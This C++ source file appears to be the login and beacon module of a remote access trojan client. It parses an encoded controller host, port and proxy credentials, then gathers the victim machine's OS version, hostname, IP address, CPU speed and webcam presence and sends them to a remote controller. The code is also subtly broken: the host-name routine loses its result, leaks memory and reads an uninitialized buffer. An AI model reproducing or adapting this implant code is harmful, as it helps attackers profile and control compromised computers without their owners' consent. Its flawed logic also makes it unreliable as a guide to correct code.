#include "stdafx.h"
#include "LogIn.h"

void SplitLoginInfo(char *lpDecodeString, char **lppszHost, LPDWORD lppPort, char **lppszProxyHost, LPDWORD lppProxyPort,
	char **lppszProxyUser, char **lppszProxyPass)
{
	*lppszHost = NULL;
	*lppPort = 0;
	*lppszProxyHost = NULL;
	*lppProxyPort = 0;
	*lppszProxyUser = NULL;
	*lppszProxyPass = NULL;

	bool	bIsProxyUsed = false;
	bool	bIsAuth = false;
	UINT	nSize = lstrlenA(lpDecodeString) + 1;
	char	*lpString = new char[nSize];
	memcpy(lpString, lpDecodeString, nSize);

	char	*pStart, *pNext, *pEnd;
	*lppszHost = lpString;

	if ((pStart = strchr(lpString, ':')) == NULL)
		return;

	*pStart = '\0';
	if ((pNext = strchr(pStart + 1, '|')) != NULL)
	{
		bIsProxyUsed = true;
		*pNext = '\0';
	}
	*lppPort = atoi(pStart + 1);

	if (!bIsProxyUsed)
		return;

	pNext++;
	*lppszProxyHost = pNext;

	if ((pStart = strchr(pNext, ':')) == NULL)
		return;

	*pStart = '\0';
	if ((pNext = strchr(pStart + 1, '|')) != NULL)
	{
		bIsAuth = true;
		*pNext = '\0';
	}
	*lppProxyPort = atoi(pStart + 1);

	if (!bIsAuth)
		return;

	pNext++;
	*lppszProxyUser = pNext;
	if ((pStart = strchr(pNext, ':')) == NULL)
		return;
	*pStart = '\0';
	*lppszProxyPass = pStart + 1;
}


// Get System Information
DWORD CPUClockMhz()
{
	HKEY	hKey;
	DWORD	dwCPUMhz;
	DWORD	dwBytes = sizeof(DWORD);
	DWORD	dwType = REG_DWORD;
	RegOpenKey(HKEY_LOCAL_MACHINE, _T("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0"), &hKey);
	RegQueryValueEx(hKey, _T("~MHz"), NULL, &dwType, (PBYTE)&dwCPUMhz, &dwBytes);
	RegCloseKey(hKey);
	return	dwCPUMhz;
}

bool IsWebCam()
{
	bool	bRet = false;

	char	lpszName[100], lpszVer[50];
	for (int i = 0; i < 10 && !bRet; i++)
	{
		bRet = capGetDriverDescriptionA(i, lpszName, sizeof(lpszName),
			lpszVer, sizeof(lpszVer));
	}
	return bRet;
}

UINT GetHostRemark(LPCTSTR lpServiceName, wchar_t* lpBuffer, UINT uSize)
{

	CString strSubKey;
	memset(lpBuffer, 0, uSize);

	strSubKey.Format(_T("SYSTEM\\CurrentControlSet\\Services\\%s") ,lpServiceName);
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, _T("Host"), REG_SZ, lpBuffer, NULL, uSize, 0);
	char hostname[256] ;
	if (lstrlen(lpBuffer) == 0)
		gethostname(hostname, uSize);

	size_t len = strlen(hostname) + 1;
	size_t converted = 0;
	
	lpBuffer=(wchar_t*)malloc(len*sizeof(wchar_t));
	mbstowcs_s(&converted, lpBuffer, len, hostname, _TRUNCATE);

	return lstrlen(lpBuffer);
}

int sendLoginInfo(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed)
{
	int nRet = SOCKET_ERROR;
	// 登录信息
	LOGININFO	LoginInfo;
	// 开始构造数据
	LoginInfo.bToken = TOKEN_LOGIN; // 令牌为登录
	LoginInfo.bIsWebCam = 0; //没有摄像头
	LoginInfo.OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO *)&LoginInfo.OsVerInfoEx); // 注意转换类型
	// IP信息

	// 主机名
	wchar_t hostname[256];
	GetHostRemark(strServiceName, hostname, sizeof(hostname));

	// 连接的IP地址
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	getsockname(pClient->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);


	memcpy(&LoginInfo.IPAddress, (void *)&sockAddr.sin_addr, sizeof(IN_ADDR));
	memcpy(&LoginInfo.HostName, hostname, sizeof(LoginInfo.HostName));
	// CPU
	LoginInfo.CPUClockMhz = CPUClockMhz();
	LoginInfo.bIsWebCam = IsWebCam();

	// Speed
	LoginInfo.dwSpeed = dwSpeed;

	nRet = pClient->Send((LPBYTE)&LoginInfo, sizeof(LOGININFO));

	return nRet;
}
